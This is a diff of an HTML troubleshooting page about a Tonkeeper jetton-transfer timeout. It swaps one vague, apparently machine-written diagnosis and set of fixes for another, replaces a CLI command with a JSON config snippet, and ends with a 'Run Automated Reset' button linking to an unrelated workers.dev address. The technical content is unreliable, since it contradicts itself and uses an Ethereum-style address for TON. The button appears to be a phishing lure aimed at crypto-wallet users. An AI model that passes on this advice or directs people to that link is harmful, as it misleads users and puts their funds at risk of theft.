@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,30 +42,34 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a timeout error when attempting to transfer Tonkeeper Jettons, with the system failing to complete the transaction within the expected timeframe.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and potential loss of funds. The error message "Tonkeeper Jetton transfer loop timeout" is displayed, indicating a issue with the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a prolonged delay in the validation and confirmation of the transaction on the TON blockchain, often resulting from network congestion or issues with the node synchronization.</li>
+<li>The error occurs due to a loop in the smart contract that handles the transfer of Jettons, causing the transaction to exceed the maximum allowed execution time. This can be caused by a variety of factors, including network congestion, contract optimization issues, or incorrect configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Increase the gas limit to prioritize the transaction</li>
-<li>Adjust the transaction fee to incentivize faster validation</li>
-<li>Utilize an alternative node with potentially lower latency</li>
+<li>Increase the transaction timeout value to allow for longer execution times</li>
+<li>Optimize the smart contract to reduce the number of iterations in the transfer loop</li>
+<li>Update the Tonkeeper client to the latest version, which may include fixes for this issue</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>transferJetton<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--payload<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>tonos-cli<span class="w"> </span>encode<span class="w"> </span>message<span class="w"> </span><span class="s1">&#39;(addr:address) = &lt;recipient_address&gt;; (uint64) = &lt;amount&gt;&#39;</span><span class="w"> </span><span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--abi<span class="w"> </span>../path/to/contract.abi.json
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;contract&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... jetton contract address ...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2000000</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Tonos-cli installed and configured
-* Access to the contract ABI file
-* Sufficient funds and permissions for the transaction</p>
-<p>Consider utilizing an external console with advanced debugging capabilities for further troubleshooting.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<p>Consider utilizing an external console for advanced troubleshooting and configuration. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonkeeper client installed and configured</li>
+<li>Basic understanding of TON blockchain and smart contracts</li>
+<li>Access to the Tonkeeper console or API</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
